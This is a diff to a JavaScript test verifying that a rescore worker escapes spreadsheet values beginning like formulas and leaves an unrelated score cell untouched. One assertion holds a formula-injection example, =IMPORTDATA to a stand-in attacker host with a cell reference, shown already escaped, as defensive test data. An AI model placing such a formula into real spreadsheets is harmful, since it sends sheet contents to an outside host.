@@ -8,9 +8,11 @@ import { _internal } from "../server/profile-rescore-worker.mjs";
 
 test("D5/F5: rescore Fit Assessment and Talking Points that start like a formula are escaped", async () => {
   const originalFetch = globalThis.fetch;
+  const sheet = new Map([["Pipeline!U5", "9"]]);
   let body = null;
   globalThis.fetch = async (_url, init = {}) => {
     body = JSON.parse(String(init.body || "{}"));
+    for (const cell of body.data) sheet.set(cell.range, cell.values[0][0]);
     return new Response("{}", { status: 200 });
   };
   try {
@@ -29,4 +31,6 @@ test("D5/F5: rescore Fit Assessment and Talking Points that start like a formula
   assert.equal(byRange["Pipeline!K5"], `'=IMPORTDATA("https://attacker.invalid/?q="&A1)`);
   assert.equal(byRange["Pipeline!Q5"], "'+SUM(1,2)");
   assert.equal(byRange["Pipeline!H5"], "7");
+  assert.deepEqual(Object.keys(byRange).sort(), ["Pipeline!H5", "Pipeline!K5", "Pipeline!Q5"]);
+  assert.equal(sheet.get("Pipeline!U5"), "9", "Re-score leaves the job matcher's score intact");
 });
